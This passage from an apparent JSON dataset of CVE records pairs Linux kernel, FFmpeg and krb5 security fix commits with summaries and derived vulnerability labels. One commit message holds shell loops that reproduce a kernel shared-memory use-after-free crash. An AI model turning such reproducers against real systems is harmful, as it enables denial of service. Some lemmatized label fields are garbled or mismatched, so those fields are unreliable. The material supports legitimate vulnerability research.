<vegard.nossum@gmail.com>\ncc: stable@kernel.org\nSigned-off-by: Eric Paris <eparis@redhat.com>","summary":"Memory leak in the inotify_init1 function in fs\/notify\/inotify\/inotify_user.c in the Linux kernel before 2.6.37 allows local users to cause a denial of service (memory consumption) via vectors involving failed attempts to create files.","commit_message_1":"stop kernel memory leak on file creation failure if inotify_init is unable to allocate a new file for the new inotify group we leak the new group","Vulnerability Type":"memory leak","Attack Vector":"via vectors involving failed attempts to create files","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by a memory leak","Attack Type":"local attacker"},{"commit_id":"f5563318ff1bde15b10e736e97ffce13be08bc1a","cve_id":"CVE-2013-7027","cwe_id":"CWE-119","commit_message":"wireless: radiotap: fix parsing buffer overrun\n\nWhen parsing an invalid radiotap header, the parser can overrun\nthe buffer that is passed in because it doesn't correctly check\n 1) the minimum radiotap header size\n 2) the space for extended bitmaps\n\nThe first issue doesn't affect any in-kernel user as they all\ncheck the minimum size before calling the radiotap function.\nThe second issue could potentially affect the kernel if an skb\nis passed in that consists only of the radiotap header with a\nlot of extended bitmaps that extend past the SKB. In that case\na read-only buffer overrun by at most 4 bytes is possible.\n\nFix this by adding the appropriate checks to the parser.\n\nCc: stable@vger.kernel.org\nReported-by: Evan Huus <eapache@gmail.com>\nSigned-off-by: Johannes Berg <johannes.berg@intel.com>","summary":"The ieee80211_radiotap_iterator_init function in net\/wireless\/radiotap.c in the Linux kernel before 3.11.7 does not check whether a frame contains any data outside of the header, which might allow attackers to cause a denial of service (buffer over-read) via a crafted header.","commit_message_1":"radiotap : fix parsing buffer overrun when parsing an invalid radiotap header , the parser can overrun the buffer that is passed in because it doe n't correctly check <number> ) the minimum radiotap header size <number> ) the space for extended bitmap the first issue doe n't affect any in-kernel user a they all check the minimum size before calling the radiotap function","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted header","Impact":"cause a denial of service ( buffer over - read )","Root Cause":"does not check whether a frame contains any data outside of the header","Attack Type":"attacker"},{"commit_id":"a399b29dfbaaaf91162b2dc5a5875dd51bbfa2a1","cve_id":"CVE-2013-7026","cwe_id":"CWE-362","commit_message":"ipc,shm: fix shm_file deletion races\n\nWhen IPC_RMID races with other shm operations there's potential for\nuse-after-free of the shm object's associated file (shm_file).\n\nHere's the race before this patch:\n\n  TASK 1                     TASK 2\n  ------                     ------\n  shm_rmid()\n    ipc_lock_object()\n                             shmctl()\n                             shp = shm_obtain_object_check()\n\n    shm_destroy()\n      shum_unlock()\n      fput(shp->shm_file)\n                             ipc_lock_object()\n                             shmem_lock(shp->shm_file)\n                             <OOPS>\n\nThe oops is caused because shm_destroy() calls fput() after dropping the\nipc_lock.  fput() clears the file's f_inode, f_path.dentry, and\nf_path.mnt, which causes various NULL pointer references in task 2.  I\nreliably see the oops in task 2 if with shmlock, shmu\n\nThis patch fixes the races by:\n1) set shm_file=NULL in shm_destroy() while holding ipc_object_lock().\n2) modify at risk operations to check shm_file while holding\n   ipc_object_lock().\n\nExample workloads, which each trigger oops...\n\nWorkload 1:\n  while true; do\n    id=$(shmget 1 4096)\n    shm_rmid $id &\n    shmlock $id &\n    wait\n  done\n\n  The oops stack shows accessing NULL f_inode due to racing fput:\n    _raw_spin_lock\n    shmem_lock\n    SyS_shmctl\n\nWorkload 2:\n  while true; do\n    id=$(shmget 1 4096)\n    shmat $id 4096 &\n    shm_rmid $id &\n    wait\n  done\n\n  The oops stack is similar to workload 1 due to NULL f_inode:\n    touch_atime\n    shmem_mmap\n    shm_mmap\n    mmap_region\n    do_mmap_pgoff\n    do_shmat\n    SyS_shmat\n\nWorkload 3:\n  while true; do\n    id=$(shmget 1 4096)\n    shmlock $id\n    shm_rmid $id &\n    shmunlock $id &\n    wait\n  done\n\n  The oops stack shows second fput tripping on an NULL f_inode.  The\n  first fput() completed via from shm_destroy(), but a racing thread did\n  a get_file() and queued this fput():\n    locks_remove_flock\n    __fput\n    ____fput\n    task_work_run\n    do_notify_resume\n    int_signal\n\nFixes: c2c737a0461e (\"ipc,shm: shorten critical region for shmat\")\nFixes: 2caacaa82a51 (\"ipc,shm: shorten critical region for shmctl\")\nSigned-off-by: Greg Thelen <gthelen@google.com>\nCc: Davidlohr Bueso <davidlohr@hp.com>\nCc: Rik van Riel <riel@redhat.com>\nCc: Manfred Spraul <manfred@colorfullife.com>\nCc: <stable@vger.kernel.org>  # 3.10.17+ 3.11.6+\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Multiple race conditions in ipc\/shm.c in the Linux kernel before 3.12.2 allow local users to cause a denial of service (use-after-free and system crash) or possibly have unspecified other impact via a crafted application that uses shmctl IPC_RMID operations in conjunction with other shm system calls.","commit_message_1":"fix shm_file deletion race when ipc_rmid race with other shm operation there 's potential for use-after-free of the shm object 's associated file ( shm_file )","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted application that uses shmctl ipc _ rmid operations in conjunction with other shm system calls","Impact":"cause a denial of service ( use - after - free and system crash ) or possibly have unspecified other impact","Root Cause":"caused by multiple race conditions","Attack Type":"local attacker"},{"commit_id":"fe448cd28d674c3eff3072552eae366d0b659ce9","cve_id":"CVE-2013-7024","cwe_id":"CWE-119","commit_message":"avcodec\/jpeg2000dec: prevent out of array accesses in pixel addressing\n\nFixes Ticket2921\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The jpeg2000_decode_tile function in libavcodec\/jpeg2000dec.c in FFmpeg before 2.1 does not consider the component number in certain calculations, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.","commit_message_1":"prevent out of array access in pixel addressing fix ticket2921","Vulnerability Type":"buffer overflow","Attack Vector":"impact via crafted jpeg2000 data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other","Root Cause":"does not consider the component number","Attack Type":"remote attacker"},{"commit_id":"f31011e9abfb2ae75bb32bc44e2c34194c8dc40a","cve_id":"CVE-2013-7023","cwe_id":"CWE-119","commit_message":"avcodec\/parser: reset indexes on realloc failure\n\nFixes Ticket2982\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The ff_combine_frame function in libavcodec\/parser.c in FFmpeg before 2.1 does not properly handle certain memory-allocation errors, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted data.","commit_message_1":"avcodec\/parser : reset index on realloc failure","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not properly handle certain memory - allocation errors","Attack Type":"remote attacker"},{"commit_id":"e07ac727c1cc9eed39e7f9117c97006f719864bd","cve_id":"CVE-2013-7022","cwe_id":"CWE-119","commit_message":"avcodec\/g2meet: Fix framebuf size\n\nCurrently the code can in some cases draw tiles that hang outside the\nallocated buffer. This patch increases the buffer size to avoid out\nof array accesses. An alternative would be to fail if such tiles are\nencountered.\nI do not know if any valid files use such hanging tiles.\n\nFixes Ticket2971\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The g2m_init_buffers function in libavcodec\/g2meet.c in FFmpeg before 2.1 does not properly allocate memory for tiles, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Go2Webinar data.","commit_message_1":"fix framebuf size currently the code can in some case draw tile that hang outside the allocated buffer","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted go2webinar data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not properly allocate memory for tiles","Attack Type":"remote attacker"},{"commit_id":"cdd5df8189ff1537f7abe8defe971f80602cc2d2","cve_id":"CVE-2013-7021","cwe_id":"CWE-399","commit_message":"avfilter\/vf_fps: make sure the fifo is not empty before using it\n\nFixes Ticket2905\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The filter_frame function in libavfilter\/vf_fps.c in FFmpeg before 2.1 does not properly ensure the availability of FIFO content, which allows remote attackers to cause a denial of service (double free) or possibly have unspecified other impact via crafted data.","commit_message_1":"make sure the fifo is not empty before using it fix ticket2905","Vulnerability Type":"Resource Management Errors","Attack Vector":"via crafted data","Impact":"cause a denial of service ( double free ) or possibly have unspecified other impact","Root Cause":"does not properly ensure the availability of fifo content","Attack Type":"remote attacker"},{"commit_id":"b05cd1ea7e45a836f7f6071a716c38bb30326e0f","cve_id":"CVE-2013-7020","cwe_id":"CWE-119","commit_message":"ffv1dec: Check bits_per_raw_sample and colorspace for equality in ver 0\/1 headers\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The read_header function in libavcodec\/ffv1dec.c in FFmpeg before 2.1 does not properly enforce certain bit-count and colorspace constraints, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted FFV1 data.","commit_message_1":"check bits_per_raw_sample and colorspace for equality in ver <number>\/<number> header","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted ffv1 data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not properly enforce certain bit - count and colorspace constraints","Attack Type":"remote attacker"},{"commit_id":"a1b9004b768bef606ee98d417bceb9392ceb788d","cve_id":"CVE-2013-7019","cwe_id":"CWE-20","commit_message":"avcodec\/jpeg2000dec: fix context consistency with too large lowres\n\nFixes out of array accesses\nFixes Ticket2898\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The get_cox function in libavcodec\/jpeg2000dec.c in FFmpeg before 2.1 does not properly validate the reduction factor, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.","commit_message_1":"fix context consistency with too large lowres fix out of array access fix ticket2898","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted jpeg2000 data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not properly validate the reduction factor","Attack Type":"remote attacker"},{"commit_id":"9a271a9368eaabf99e6c2046103acb33957e63b7","cve_id":"CVE-2013-7018","cwe_id":"CWE-119","commit_message":"jpeg2000: check log2_cblk dimensions\n\nFixes out of array access\nFixes Ticket2895\n\nFound-by: Piotr Bandurski <ami_stuff@o2.pl>\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"libavcodec\/jpeg2000dec.c in FFmpeg before 2.1 does not ensure the use of valid code-block dimension values, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.","commit_message_1":"check log2_cblk dimension fix out of array access fix ticket2895","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted jpeg2000 data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not ensure the use of valid code - block dimension values","Attack Type":"remote attacker"},{"commit_id":"912ce9dd2080c5837285a471d750fa311e09b555","cve_id":"CVE-2013-7017","cwe_id":null,"commit_message":"jpeg2000: fix dereferencing invalid pointers\n\nFound-by: Laurent Butti <laurentb@gmail.com>\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"libavcodec\/jpeg2000.c in FFmpeg before 2.1 allows remote attackers to cause a denial of service (invalid pointer dereference) or possibly have unspecified other impact via crafted JPEG2000 data.","commit_message_1":"jpeg2000 : fix dereferencing invalid pointer","Vulnerability Type":"invalid pointer dereference","Attack Vector":"via crafted jpeg2000 data","Impact":"cause a denial of service ( invalid pointer dereference ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"8bb11c3ca77b52e05a9ed1496a65f8a76e6e2d8f","cve_id":"CVE-2013-7016","cwe_id":"CWE-119","commit_message":"avcodec\/jpeg2000dec: Check cdx\/y values more carefully\n\nSome invalid values where not handled correctly in the later pixel\nformat matching code.\nFixes out of array accesses\nFixes Ticket2848\n\nFound-by: Piotr Bandurski <ami_stuff@o2.pl>\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The get_siz function in libavcodec\/jpeg2000dec.c in FFmpeg before 2.1 does not ensure the expected sample separation, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.","commit_message_1":"check cdx\/y value more carefully some invalid value where not handled correctly in the later pixel format matching code","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted jpeg2000 data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not ensure the expected sample separation","Attack Type":"remote attacker"},{"commit_id":"880c73cd76109697447fbfbaa8e5ee5683309446","cve_id":"CVE-2013-7015","cwe_id":"CWE-20","commit_message":"avcodec\/flashsv: check diff_start\/height\n\nFixes out of array accesses\nFixes Ticket2844\n\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The flashsv_decode_frame function in libavcodec\/flashsv.c in FFmpeg before 2.1 does not properly validate a certain height value, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Flash Screen Video data.","commit_message_1":"check diff_start\/height fix out of array access fix ticket2844","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted flash screen video data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not properly validate a certain height value","Attack Type":"remote attacker"},{"commit_id":"86736f59d6a527d8bc807d09b93f971c0fe0bb07","cve_id":"CVE-2013-7014","cwe_id":"CWE-189","commit_message":"avcodec\/pngdsp: fix (un)signed type in end comparission\n\nFixes out of array accesses\nFixes Ticket2919\n\nFound_by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"Integer signedness error in the add_bytes_l2_c function in libavcodec\/pngdsp.c in FFmpeg before 2.1 allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted PNG data.","commit_message_1":"fix ( un ) signed type in end comparission fix out of array access fix ticket2919 found_by : ami_stuff","Vulnerability Type":"Numeric Errors","Attack Vector":"via crafted png data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow error","Attack Type":"remote attacker"},{"commit_id":"821a5938d100458f4d09d634041b05c860554ce0","cve_id":"CVE-2013-7013","cwe_id":"CWE-189","commit_message":"avcodec\/g2meet: Fix order of align and pixel size multiplication.\n\nFixes out of array accesses\nFixes Ticket2922\n\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The g2m_init_buffers function in libavcodec\/g2meet.c in FFmpeg before 2.1 uses an incorrect ordering of arithmetic operations, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Go2Webinar data.","commit_message_1":"fix order of align and pixel size multiplication","Vulnerability Type":"Numeric Errors","Attack Vector":"via crafted go2webinar data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"uses an incorrect ordering of arithmetic operations","Attack Type":"remote attacker"},{"commit_id":"780669ef7c23c00836a24921fcc6b03be2b8ca4a","cve_id":"CVE-2013-7012","cwe_id":"CWE-119","commit_message":"avcodec\/jpeg2000dec: non zero image offsets are not supported\n\nFixes out of array accesses\nFixes Ticket3080\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The get_siz function in libavcodec\/jpeg2000dec.c in FFmpeg before 2.1 does not prevent attempts to use non-zero image offsets, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.","commit_message_1":"non zero image offset are not supported fix out of array access fix ticket3080","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted jpeg2000 data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not prevent attempts to use non - zero image offsets","Attack Type":"remote attacker"},{"commit_id":"547d690d676064069d44703a1917e0dab7e33445","cve_id":"CVE-2013-7011","cwe_id":"CWE-119","commit_message":"ffv1dec: check that global parameters dont change in version 0\/1\n\nSuch changes are not allowed nor supported\n\nFixes Ticket2906\n\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The read_header function in libavcodec\/ffv1dec.c in FFmpeg before 2.1 does not prevent changes to global parameters, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted FFV1 data.","commit_message_1":"check that global parameter dont change in version <number>\/<number> such change are not allowed nor supported fix ticket2906","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted ffv1 data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not prevent changes to global parameters","Attack Type":"remote attacker"},{"commit_id":"454a11a1c9c686c78aa97954306fb63453299760","cve_id":"CVE-2013-7010","cwe_id":"CWE-189","commit_message":"avcodec\/dsputil: fix signedness in sizeof() comparissions\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"Multiple integer signedness errors in libavcodec\/dsputil.c in FFmpeg before 2.1 allow remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted data.","commit_message_1":"avcodec\/dsputil : fix signedness in sizeof ( ) comparissions","Vulnerability Type":"Numeric Errors","Attack Vector":"via crafted data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"3819db745da2ac7fb3faacb116788c32f4753f34","cve_id":"CVE-2013-7009","cwe_id":"CWE-119","commit_message":"avcodec\/rpza: Perform pointer advance and checks before using the pointers\n\nFixes out of array accesses\nFixes Ticket2850\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The rpza_decode_stream function in libavcodec\/rpza.c in FFmpeg before 2.1 does not properly maintain a pointer to pixel data, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Apple RPZA data.","commit_message_1":"perform pointer advance and check before using the pointer fix out of array access fix ticket2850","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted apple rpza data","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"does not properly maintain a pointer to pixel data","Attack Type":"remote attacker"},{"commit_id":"29ffeef5e73b8f41ff3a3f2242d356759c66f91f","cve_id":"CVE-2013-7008","cwe_id":null,"commit_message":"avcodec\/h264: do not trust last_pic_droppable when marking pictures as done\n\nThis simplifies the code and fixes a deadlock\n\nFixes Ticket2927\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The decode_slice_header function in libavcodec\/h264.c in FFmpeg before 2.1 incorrectly relies on a certain droppable field, which allows remote attackers to cause a denial of service (deadlock) or possibly have unspecified other impact via crafted H.264 data.","commit_message_1":"do not trust last_pic_droppable when marking picture a done this simplifies the code and fix a deadlock fix ticket2927","Vulnerability Type":"deadlock","Attack Vector":"via crafted h . 264 data","Impact":"cause a denial of service ( deadlock ) or possibly have unspecified other impact","Root Cause":"on a certain droppable field","Attack Type":"remote attacker"},{"commit_id":"c2ccf4197f697c4ff143b8a786acdd875e70a89d","cve_id":"CVE-2013-6800","cwe_id":null,"commit_message":"Multi-realm KDC null deref [CVE-2013-1418]\n\nIf a KDC serves multiple realms, certain requests can cause\nsetup_server_realm() to dereference a null pointer, crashing the KDC.\n\nCVSSv2: AV:N\/AC:M\/Au:N\/C:N\/I:N\/A:P\/E:POC\/RL:OF\/RC:C\n\nA related but more minor vulnerability requires authentication to\nexploit, and is only present if a third-party KDC database module can\ndereference a null pointer under certain conditions.\n\n(back ported from commit 5d2d9a1abe46a2c1a8614d4672d08d9d30a5f8bf)\n\nticket: 7757 (new)\nversion_fixed: 1.10.7\nstatus: resolved","summary":"An unspecified third-party database module for the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) 1.10.x allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted request, a different vulnerability than CVE-2013-1418.","commit_message_1":"multi-realm kdc null deref [ <cve_id> ] if a kdc serf multiple realm , certain request can cause setup_server_realm ( ) to dereference a null pointer , crashing the kdc","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted request , a different vulnerability than cve - 2013 - 1418","Impact":"cause a denial of service ( pointer dereference and daemon crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"7314e613d5ff9f0934f7a0f74ed7973b903315d1","cve_id":"CVE-2013-6763","cwe_id":"CWE-119","commit_message":"Fix a few incorrectly checked [io_]remap_pfn_range() calls\n\nNico Golde reports a few straggling uses of [io_]remap_pfn_range() that\nreally should use the vm_iomap_memory() helper.  This trivially converts\ntwo of them to the helper, and comments about why the third one really\nneeds to continue to use remap_pfn_range(), and adds the missing size\ncheck.\n\nReported-by: Nico Golde <nico@ngolde.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.","summary":"The uio_mmap_physical function in drivers\/uio\/uio.c in the Linux kernel before 3.12 does not validate the size of a memory block, which allows local users to cause a denial of service (memory corruption) or possibly gain privileges via crafted mmap operations, a different vulnerability than CVE-2013-4511.","commit_message_1":"fix a few incorrectly checked [ io_ ] remap_pfn_range ( ) call nico golde report a few straggling us of [ io_ ] remap_pfn_range ( ) that really should use the vm_iomap_memory ( ) helper","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted mmap operations , a different vulnerability than cve - 2013 - 4511","Impact":"cause a denial of service ( memory corruption ) or possibly gain privileges","Root Cause":"does not validate the size of a memory block","Attack Type":"local attacker"},{"commit_id":"cf970c002d270c36202bd5b9c2804d3097a52da0","cve_id":"CVE-2013-6432","cwe_id":null,"commit_message":"ping: prevent NULL pointer dereference on write to msg_name\n\nA plain read() on a socket does set msg->msg_name to NULL. So check for\nNULL pointer first.\n\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ping_recvmsg function in net\/ipv4\/ping.c in the Linux kernel before 3.12.4 does not properly interact with read system calls on ping sockets, which allows local users to cause a denial of service (NULL pointer dereference and system crash) by leveraging unspecified privileges to execute a crafted application.","commit_message_1":"prevent null pointer dereference on write to msg_name a plain read ( ) on a socket doe set msg- > msg_name to null","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by leveraging unspecified privileges to execute a crafted application","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"does not properly interact with read system calls on ping sockets","Attack Type":"local attacker"},{"commit_id":"ae7b4e1f213aa659aedf9c6ecad0bf5f0476e1e2","cve_id":"CVE-2013-6431","cwe_id":"CWE-264","commit_message":"net: fib: fib6_add: fix potential NULL pointer dereference\n\nWhen the kernel is compiled with CONFIG_IPV6_SUBTREES, and we return\nwith an error in fn = fib6_add_1(), then error codes are encoded into\nthe return pointer e.g. ERR_PTR(-ENOENT). In such an error case, we\nwrite the error code into err and jump to out, hence enter the if(err)\ncondition. Now, if CONFIG_IPV6_SUBTREES is enabled, we check for:\n\n  if (pn != fn && pn->leaf == rt)\n    ...\n  if (pn != fn && !pn->leaf && !(pn->fn_flags & RTN_RTINFO))\n    ...\n\nSince pn is NULL and fn is f.e. ERR_PTR(-ENOENT), then pn != fn\nevaluates to true and causes a NULL-pointer dereference on further\nchecks on pn. Fix it, by setting both NULL in error case, so that\npn != fn already evaluates to false and no further dereference\ntakes place.\n\nThis was first correctly implemented in 4a287eba2 (\"IPv6 routing,\nNLM_F_* flag support: REPLACE and EXCL flags support, warn about\nmissing CREATE flag\"), but the bug got later on introduced by\n188c517a0 (\"ipv6: return errno pointers consistently for fib6_add_1()\").\n\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nCc: Lin Ming <mlin@ss.pku.edu.cn>\nCc: Matti Vaittinen <matti.vaittinen@nsn.com>\nCc: Hannes Frederic Sowa <hannes@stressinduktion.org>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nAcked-by: Matti Vaittinen <matti.vaittinen@nsn.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The fib6_add function in net\/ipv6\/ip6_fib.c in the Linux kernel before 3.11.5 does not properly implement error-code encoding, which allows local users to cause a denial of service (NULL pointer dereference and system crash) by leveraging the CAP_NET_ADMIN capability for an IPv6 SIOCADDRT ioctl call.","commit_message_1":"fib : fib6_add : fix potential null pointer dereference when the kernel is compiled with config_ipv6_subtrees , and we return with an error in fn = fib6_add_1 ( ) , then error code are encoded into the return pointer <file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging the cap _ net _ admin capability for an ipv6 siocaddrt ioctl call","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"does not properly implement error - code encoding ,","Attack Type":"local attacker"},{"commit_id":"f856567b930dfcdbc3323261bf77240ccdde01f5","cve_id":"CVE-2013-6383","cwe_id":"CWE-264","commit_message":"aacraid: missing capable() check in compat ioctl\n\nIn commit d496f94d22d1 ('[SCSI] aacraid: fix security weakness') we\nadded a check on CAP_SYS_RAWIO to the ioctl.  The compat ioctls need the\ncheck as well.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The aac_compat_ioctl function in drivers\/scsi\/aacraid\/linit.c in the Linux kernel before 3.11.8 does not require the CAP_SYS_RAWIO capability, which allows local users to bypass intended access restrictions via a crafted ioctl call.","commit_message_1":"missing capable ( ) check in compat ioctl in commit d496f94d22d1 ( ' [ scsi ] aacraid : fix security weakness ' ) we added a check on cap_sys_rawio to the ioctl","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted ioctl call","Impact":"bypass intended access restrictions","Root Cause":"does not require the cap _ sys _ rawio capability ","Attack Type":"local attacker"},{"commit_id":"6fb392b1a63ae36c31f62bc3fc8630b49d602b62","cve_id":"CVE-2013-6381","cwe_id":"CWE-119","commit_message":"qeth: avoid buffer overflow in snmp ioctl\n\nCheck user-defined length in snmp ioctl request and allow request\nonly if it fits into a qeth command buffer.\n\nSigned-off-by: Ursula Braun <ursula.braun@de.ibm.com>\nSigned-off-by: Frank Blaschka <frank.blaschka@de.ibm.com>\nReviewed-by: Heiko Carstens <heicars2@linux.vnet.ibm.com>\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nCc: <stable@vger.kernel.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Buffer overflow in the qeth_snmp_command function in drivers\/s390\/net\/qeth_core_main.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service or possibly have unspecified other impact via an SNMP ioctl call with a length value that is incompatible with the command-buffer size.","commit_message_1":"avoid buffer overflow in snmp ioctl check user-defined length in snmp ioctl request and allow request only if it fit into a qeth command buffer","Vulnerability Type":"buffer overflow","Attack Vector":"via an snmp ioctl call with a length value that is incompatible with the command - buffer size","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"built with a Gigabit Ethernet device support(CONFIG_QETH)","Attack Type":"local attacker"},{"commit_id":"b4789b8e6be3151a955ade74872822f30e8cd914","cve_id":"CVE-2013-6380","cwe_id":"CWE-20","commit_message":"aacraid: prevent invalid pointer dereference\n\nIt appears that driver runs into a problem here if fibsize is too small\nbecause we allocate user_srbcmd with fibsize size only but later we\naccess it until user_srbcmd->sg.count to copy it over to srbcmd.\n\nIt is not correct to test (fibsize < sizeof(*user_srbcmd)) because this\nstructure already includes one sg element and this is not needed for\ncommands without data.  So, we would recommend to add the following\n(instead of test for fibsize == 0).\n\nSigned-off-by: Mahesh Rajashekhara <Mahesh.Rajashekhara@pmcs.com>\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The aac_send_raw_srb function in drivers\/scsi\/aacraid\/commctrl.c in the Linux kernel through 3.12.1 does not properly validate a certain size value, which allows local users to cause a denial of service (invalid pointer dereference) or possibly have unspecified other impact via an FSACTL_SEND_RAW_SRB ioctl call that triggers a crafted SRB command.","commit_message_1":"prevent invalid pointer dereference it appears that driver run into a problem here if fibsize is too small because we allocate user_srbcmd with fibsize size only but later we access it until user_srbcmd- > <file> to copy it over to srbcmd","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an fsactl _ send _ raw _ srb ioctl call that triggers a crafted srb command","Impact":"cause a denial of service ( invalid pointer dereference ) or possibly have unspecified other impact","Root Cause":"does not properly validate a certain size value","Attack Type":"local attacker"},{"commit_id":"a497e47d4aec37aaf8f13509f3ef3d1f6a717d88","cve_id":"CVE-2013-6378","cwe_id":"CWE-189","commit_message":"libertas: potential oops in debugfs\n\nIf we do a zero size allocation then it will oops.  Also we can't be\nsure the user passes us a NUL terminated string so I've added a\nterminator.\n\nThis code can only be triggered by root.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nAcked-by: Dan Williams <dcbw@redhat.com>\nSigned-off-by: John W. Linville <linville@tuxdriver.com>","summary":"The lbs_debugfs_write function in drivers\/net\/wireless\/libertas\/debugfs.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service (OOPS) by leveraging root privileges for a zero-length write operation.","commit_message_1":"potential oops in debugfs if we do a zero size allocation then it will oops","Vulnerability Type":"Numeric Errors","Attack Vector":"by leveraging root privileges for a zero - length write operation","Impact":"cause a denial of service ( oops )","Root Cause":"caused by a invalid dereference error","Attack Type":"local 